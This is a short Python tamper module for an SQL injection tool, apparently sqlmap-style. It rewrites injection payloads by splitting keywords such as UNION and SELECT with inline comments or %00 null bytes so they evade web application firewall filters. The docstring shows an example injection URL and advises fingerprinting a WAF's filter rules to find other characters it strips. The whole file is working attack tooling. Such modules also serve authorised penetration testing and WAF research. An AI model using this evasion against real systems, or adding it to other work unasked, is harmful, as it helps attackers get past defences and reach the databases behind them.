# -*- coding: utf-8 -*
import re,random

from main_modules.settings import PRIORITY, TYPE
__classificationtype__=TYPE.BackEND_SPECIFIED
__priority__ = PRIORITY.LOW

priority = 'normal'

def tamper(payload, **kwargs):
    """
    /?id=1+un/**/ion+sel/**/ect+1,2,3—
    /**/our_string[1][1]/**/our_string[1][2]/**/our_string[2][1]/**/our_string[2][2]/**/  => /**/uni/**/on/**/sel/**/ect/**/
    As you can understand, instead of the /**/ comment symbol, any symbol sequence that WAF cuts off can be used (e.g., #####, %00), but we have to know, and we can find it out by fingerprinting the filter rules of the WAF
    """
    string=''
  
    payload=payload.replace(' ','+')
    result=[payload,payload]
    for word in payload.split('+'):
        if re.search(r'^\w+',word) and len(word)>2 and re.search(r'\d',word) is None:
            new_word=''
            split_point=random.randint(1,len(word)-1)
            new_word=word[:split_point]+'/**/'+word[split_point:]
            result[0]=result[0].replace(word,new_word)
            new_word=word[:split_point]+'%00'+word[split_point:]
            result[1]=result[1].replace(word,new_word)

            

    
    return (result) if payload else payload